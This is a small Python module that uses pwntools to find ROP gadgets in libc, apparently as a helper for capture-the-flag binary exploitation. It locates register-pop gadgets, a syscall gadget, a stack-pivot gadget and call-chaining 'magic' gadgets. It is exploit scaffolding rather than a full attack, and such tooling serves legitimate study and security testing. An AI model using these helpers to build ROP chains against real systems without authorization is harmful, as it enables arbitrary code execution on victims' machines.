from pwn import asm
from pwnvar import pwnlibc


def get_magic_gadget1():
    return pwnlibc.search(
        asm("mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]",
            arch="amd64")).__next__()


def get_magic_gadget2():
    return pwnlibc.search(asm("mov rsp, rdx; ret", arch="amd64")).__next__()


def get_magic_gadget3():
    return pwnlibc.search(asm('add rsp, 0x30; mov rax, r12; pop r12; ret', arch="amd64")).__next__()


def get_pop_rdi():
    return pwnlibc.search(asm("pop rdi; ret", arch="amd64")).__next__()


def get_pop_rsi():
    return pwnlibc.search(asm("pop rsi; ret", arch="amd64")).__next__()


def get_pop_rax():
    return pwnlibc.search(asm("pop rax; ret", arch="amd64")).__next__()


def get_ret():
    return pwnlibc.search(asm("ret", arch="amd64")).__next__()


def get_pop_rdx_r12():
    return pwnlibc.search(asm("mov rdx, r12; pop r12; ret", arch="amd64")).__next__()


def get_syscall():
    return pwnlibc.search(asm("syscall; ret", arch="amd64")).__next__()
